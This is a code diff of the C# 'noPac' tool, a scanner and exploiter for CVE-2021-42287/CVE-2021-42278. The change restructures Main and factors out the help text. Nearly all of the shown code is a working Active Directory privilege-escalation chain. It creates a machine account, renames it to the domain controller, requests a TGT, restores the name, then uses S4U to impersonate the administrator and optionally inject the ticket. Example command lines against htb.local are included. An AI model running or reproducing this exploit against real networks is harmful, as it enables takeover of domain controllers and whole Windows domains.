@@ -1,4 +1,4 @@
-﻿using Rubeus;
+using Rubeus;
 using System;
 using System.Collections.Generic;
 using System.DirectoryServices;
@@ -12,8 +12,162 @@ using System.Text;
 
 namespace noPac
 {
-    internal class Program
+    public class Program
     {
+        public static void Main(string[] args)
+        {
+            string argDomainUser = "";
+            string argDomainUserPassword = "";
+            
+            string argContainer = "COMPUTERS";
+            string argDistinguishedName = "";
+            string argDomain = "";
+            string argDomainController = "";
+            string argTargetSPN = "";
+            string argService = "LDAP";
+            string argImpersonate = "administrator";
+            bool argPTT = false;
+
+            string argMachineAccount = "";
+            string argMachinePassword = "";
+
+            bool argRandom = false;
+            bool argVerbose = true;
+            Rubeus.lib.Interop.LUID luid = new Rubeus.lib.Interop.LUID();
+
+            if (args == null || !args.Any())
+            {
+                PrintHelp();
+                return;
+            }
+
+            foreach (var entry in args.Select((value, index) => new { index, value }))
+            {
+                string argument = entry.value.ToUpper();
+
+                switch (argument)
+                {
+                    case "-DOMAIN":
+                    case "/DOMAIN":
+                        argDomain = args[entry.index + 1];
+                        break;
+
+                    case "-USER":
+                    case "/USER":
+                        argDomainUser = args[entry.index + 1];
+                        break;
+
+                    case "-PASS":
+                    case "/PASS":
+                        argDomainUserPassword = args[entry.index + 1];
+                        break;
+                    case "-DC":
+                    case "/DC":
+                        argDomainController = args[entry.index + 1];
+                        break;
+                    case "-MACCOUNT":
+                    case "/MACCOUNT":
+                        argMachineAccount = args[entry.index + 1];
+                        break;
+                    case "-MPASSWORD":
+                    case "/MPASSWORD":
+                        argMachinePassword = args[entry.index + 1];
+                        break;
+                    case "-SERVICE":
+                    case "/SERVICE":
+                        argService = args[entry.index + 1];
+                        break;
+                    case "-IMPERSONATE":
+                    case "/IMPERSONATE":
+                        argImpersonate = args[entry.index + 1];
+                        break;
+                    case "-PTT":
+                    case "/PTT":
+                        argPTT = true;
+                        break;
+                }
+            }
+            NetworkCredential credential = new NetworkCredential(argDomainUser, argDomainUserPassword, argDomain);
+            string machineAccountPasswordHash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, argMachinePassword);
+            string domainUserPasswordHash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, argDomainUserPassword);
+            if (args.Length >= 1)
+            {
+                if (args[0] == "scan")
+                {
+                    if(string.IsNullOrEmpty(argDomain) || string.IsNullOrEmpty(argDomainUser) || string.IsNullOrEmpty(argDomainUserPassword))
+                    {
+                        //Console.WriteLine("[-] /domain /user /pass argument needed for scanning");
+                        PrintHelp();
+                        return;
+                    }
+                    scan(argDomain, argDomainUser, argDomainUserPassword, domainUserPasswordHash, argDomainController);
+                    return;
+                }
+                if (string.IsNullOrEmpty(argDomainController) || string.IsNullOrEmpty(argMachineAccount) || string.IsNullOrEmpty(argMachinePassword))
+                {
+                    //Console.WriteLine("[-] /dc /mAccount /mPassword argument needed for exploitation");
+                    PrintHelp();
+                    return;
+                }
+
+                argTargetSPN = $"{argService}/{argDomainController}";
+                if(String.IsNullOrEmpty(argDomain))
+                    argDomain = String.Join(".", argDomainController.Split('.').Skip(1).ToArray());
+            }
+
+            //new machine account
+            try
+            {
+                NewMachineAccount(argContainer, argDistinguishedName, argDomain, argDomainController, argMachineAccount, argMachinePassword, argVerbose, argRandom, credential);
+            } catch (DirectoryOperationException e)
+            {
+                //so we can rerun the tool using the same machine account or reuse machine account
+                if (!e.Message.Contains("The object exists"))
+                {
+                    Console.WriteLine("[-] Failed to create machine account");
+                    return;
+                }
+            }
+
+            //clean spn
+            SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "serviceprincipalname", argMachineAccount, "", false, true, argVerbose, credential);
+
+            //set samaccountname
+            SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "samaccountname", argMachineAccount, argDomainController.Split('.')[0], false, false, argVerbose, credential);
+
+            //ask tgt
+            byte[] ticket = Ask.TGT(argDomainController.Split('.')[0], argDomain, machineAccountPasswordHash, Interop.KERB_ETYPE.rc4_hmac, "", false, argDomainController, luid, false, false, "", false, true);
+            if (ticket.Length > 0)
+            {
+                Console.WriteLine("[+] Got TGT for {0}", argDomainController);
+                //Console.WriteLine(Convert.ToBase64String(ticket));
+            }
+            else
+            {
+                Console.WriteLine("[-] Could not get TGT for {0}", argDomainController);
+                return;
+            }
+
+            //undo samaccountname change
+            SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "samaccountname", argMachineAccount, argMachineAccount, false, false, argVerbose, credential);
+
+            //s4u
+            KRB_CRED kirbi = new KRB_CRED(ticket);
+            S4U.Execute(kirbi, argImpersonate, "", "", argPTT, argDomainController, argTargetSPN, null, "", "", true, false, false, machineAccountPasswordHash, Interop.KERB_ETYPE.rc4_hmac, argDomain, "");
+        }
+
+        private static void PrintHelp()
+        {
+                Console.WriteLine();
+                Console.WriteLine("CVE-2021-42287/CVE-2021-42278 Scanner & Exploiter");
+                Console.WriteLine("By @Cube0x0 - Modified by Vibrio.");
+                Console.WriteLine("Examples:");
+                Console.WriteLine("noPac.exe scan -domain htb.local -user domain_user -pass 'Password123!'");
+                Console.WriteLine("noPac.exe -dc dc02.htb.local -mAccount demo -mPassword Password123!");
+                Console.WriteLine("noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc02.htb.local /mAccount demo /mPassword Password123!");
+                Console.WriteLine("noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc02.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt");
+        }
+
         public static string GetMAQDistinguishedName(string node, string container, string distinguishedName, string domain, bool verbose)
         {
             string[] domainComponent;
@@ -308,158 +462,6 @@ namespace noPac
                 }
             }
 
-        }
-
-        static void Main(string[] args)
-        {
-            string argDomainUser = "";
-            string argDomainUserPassword = "";
-
-            string argContainer = "COMPUTERS";
-            string argDistinguishedName = "";
-            string argDomain = "";
-            string argDomainController = "";
-            string argTargetSPN = "";
-            string argService = "LDAP";
-            string argImpersonate = "administrator";
-            bool argPTT = false;
-
-            //machine account
-            string argMachineAccount = "";
-            string argMachinePassword = "";
-
-            bool argRandom = false;
-            bool argVerbose = true;
-            Rubeus.lib.Interop.LUID luid = new Rubeus.lib.Interop.LUID();
-
-            if (args == null || !args.Any())
-            {
-                Console.WriteLine();
-                Console.WriteLine("CVE-2021-42287/CVE-2021-42278 Scanner & Exploiter");
-                Console.WriteLine("By @Cube0x0");
-                Console.WriteLine();
-                Console.WriteLine("/domain /user /pass argument needed for scanning");
-                Console.WriteLine("/dc /mAccount /nPassword argument needed for exploitation");
-                Console.WriteLine();
-                Console.WriteLine("Examples:");
-                Console.WriteLine("  noPac.exe scan -domain htb.local -user domain_user -pass 'Password123!'");
-                Console.WriteLine("  noPac.exe -dc dc02.htb.local -mAccount demo -mPassword Password123!");
-                Console.WriteLine("  noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc02.htb.local /mAccount demo /mPassword Password123!");
-                Console.WriteLine("  noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc02.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt");
-                return;
-            }
-
-            foreach (var entry in args.Select((value, index) => new { index, value }))
-            {
-                string argument = entry.value.ToUpper();
-
-                switch (argument)
-                {
-                    case "-DOMAIN":
-                    case "/DOMAIN":
-                        argDomain = args[entry.index + 1];
-                        break;
-
-                    case "-USER":
-                    case "/USER":
-                        argDomainUser = args[entry.index + 1];
-                        break;
-
-                    case "-PASS":
-                    case "/PASS":
-                        argDomainUserPassword = args[entry.index + 1];
-                        break;
-                    case "-DC":
-                    case "/DC":
-                        argDomainController = args[entry.index + 1];
-                        break;
-                    case "-MACCOUNT":
-                    case "/MACCOUNT":
-                        argMachineAccount = args[entry.index + 1];
-                        break;
-                    case "-MPASSWORD":
-                    case "/MPASSWORD":
-                        argMachinePassword = args[entry.index + 1];
-                        break;
-                    case "-SERVICE":
-                    case "/SERVICE":
-                        argService = args[entry.index + 1];
-                        break;
-                    case "-IMPERSONATE":
-                    case "/IMPERSONATE":
-                        argImpersonate = args[entry.index + 1];
-                        break;
-                    case "-PTT":
-                    case "/PTT":
-                        argPTT = true;
-                        break;
-                }
-            }
-            NetworkCredential credential = new NetworkCredential(argDomainUser, argDomainUserPassword, argDomain);
-            string machineAccountPasswordHash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, argMachinePassword);
-            string domainUserPasswordHash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, argDomainUserPassword);
-            if (args.Length >= 1)
-            {
-                if (args[0] == "scan")
-                {
-                    if(string.IsNullOrEmpty(argDomain) || string.IsNullOrEmpty(argDomainUser) || string.IsNullOrEmpty(argDomainUserPassword))
-                    {
-                        Console.WriteLine("[-] /domain /user /pass argument needed for scanning");
-                        return;
-                    }
-                    scan(argDomain, argDomainUser, argDomainUserPassword, domainUserPasswordHash, argDomainController);
-                    return;
-                }
-                if (string.IsNullOrEmpty(argDomainController) || string.IsNullOrEmpty(argMachineAccount) || string.IsNullOrEmpty(argMachinePassword))
-                {
-                    Console.WriteLine("[-] /dc /mAccount /mPassword argument needed for exploitation");
-                    return;
-                }
-
-                argTargetSPN = $"{argService}/{argDomainController}";
-                if(String.IsNullOrEmpty(argDomain))
-                    argDomain = String.Join(".", argDomainController.Split('.').Skip(1).ToArray());
-            }
-
-            //new machine account
-            try
-            {
-                NewMachineAccount(argContainer, argDistinguishedName, argDomain, argDomainController, argMachineAccount, argMachinePassword, argVerbose, argRandom, credential);
-            } catch (DirectoryOperationException e)
-            {
-                //so we can rerun the tool using the same machine account or reuse machine account
-                if (!e.Message.Contains("The object exists"))
-                {
-                    Console.WriteLine("[-] Failed to create machine account");
-                    return;
-                }
-            }
-
-            //clean spn
-            SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "serviceprincipalname", argMachineAccount, "", false, true, argVerbose, credential);
-
-            //set samaccountname
-            SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "samaccountname", argMachineAccount, argDomainController.Split('.')[0], false, false, argVerbose, credential);
-
-            //ask tgt
-            byte[] ticket = Ask.TGT(argDomainController.Split('.')[0], argDomain, machineAccountPasswordHash, Interop.KERB_ETYPE.rc4_hmac, "", false, argDomainController, luid, false, false, "", false, true);
-            if (ticket.Length > 0)
-            {
-                Console.WriteLine("[+] Got TGT for {0}", argDomainController);
-                //Console.WriteLine(Convert.ToBase64String(ticket));
-            }
-            else
-            {
-                Console.WriteLine("[-] Could not get TGT for {0}", argDomainController);
-                return;
-            }
-
-            //undo samaccountname change
-            SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "samaccountname", argMachineAccount, argMachineAccount, false, false, argVerbose, credential);
-
-            //s4u
-            KRB_CRED kirbi = new KRB_CRED(ticket);
-            S4U.Execute(kirbi, argImpersonate, "", "", argPTT, argDomainController, argTargetSPN, null, "", "", true, false, false, machineAccountPasswordHash, Interop.KERB_ETYPE.rc4_hmac, argDomain, "");
         }
     }
 }
